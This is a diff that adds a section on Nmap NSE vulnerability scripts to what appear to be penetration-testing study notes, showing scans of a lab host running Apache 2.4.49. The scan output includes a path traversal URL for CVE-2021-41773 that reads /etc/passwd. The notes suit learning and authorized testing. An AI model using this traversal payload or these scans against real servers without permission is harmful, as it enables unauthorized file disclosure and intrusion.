@@ -788,3 +788,61 @@ Common types of vulnerability scanners are `web application` and `network vulner
 > [!Note]
 > ![image](https://hackmd.io/_uploads/SyQ4_lcbJx.png)
 
+## Nmap - NSE Vulnerability Scripts
+>[!Tip]
+> NSE scripts are grouped into categories around cases such as vulnerability detection, brute forcing, and network discovery. The scripts can also extend the version detection and information-gathering capabilities of Nmap.
+
+```
+$ pwd
+/usr/local/Cellar/nmap/7.95/share/nmap
+$ ls scripts/
+acarsd-info.nse				http-huawei-hg5xx-vuln.nse		ntp-info.nse
+address-info.nse			http-icloud-findmyiphone.nse		ntp-monlist.nse
+afp-brute.nse				http-icloud-sendmsg.nse			omp2-brute.nse
+afp-ls.nse				http-iis-short-name-brute.nse		omp2-enum-targets.nse
+afp-path-vuln.nse			http-iis-webdav-vuln.nse		omron-info.nse
+afp-serverinfo.nse			http-internal-ip-disclosure.nse		openflow-info.nse
+afp-showmount.nse			http-joomla-brute.nse			openlookup-info.nse
+ajp-auth.nse				http-jsonp-detection.nse		openvas-otp-brute.nse
+ajp-brute.nse				http-litespeed-sourcecode-download.nse	openwebnet-discovery.nse
+...
+```
+- [NSE Scripts document](https://nmap.org/nsedoc/scripts/)
+```
+kali@kali:~$ sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
+[sudo] password for kali: 
+Starting Nmap 7.92 ( https://nmap.org )
+...
+PORT    STATE SERVICE VERSION
+443/tcp open  http    Apache httpd 2.4.49 ((Unix))
+...
+| vulners: 
+|   cpe:/a:apache:http_server:2.4.49:
+...
+        https://vulners.com/githubexploit/DF57E8F1-FE21-5EB9-8FC7-5F2EA267B09D	*EXPLOIT*
+|     	CVE-2021-41773	4.3	https://vulners.com/cve/CVE-2021-41773
+...
+|_http-server-header: Apache/2.4.49 (Unix)
+MAC Address: 00:0C:29:C7:81:EA (VMware)
+```
+```
+kali@kali:~$ sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.50.124
+Starting Nmap 7.92 ( https://nmap.org )
+Host is up (0.00069s latency).
+
+PORT    STATE SERVICE VERSION
+443/tcp open  http    Apache httpd 2.4.49 ((Unix))
+| http-vuln-cve2021-41773:
+|   VULNERABLE:
+|   Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49
+|     State: VULNERABLE
+|               A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by "require all denied" these requests can succeed. Additionally this flaw could leak the source of interpreted files like CGI scripts. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions.
+|           
+|     Disclosure date: 2021-10-05
+|     Check results:
+|       
+|         Verify arbitrary file read: https://192.168.50.124:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+...
+Nmap done: 1 IP address (1 host up) scanned in 6.86 seconds
+```
+
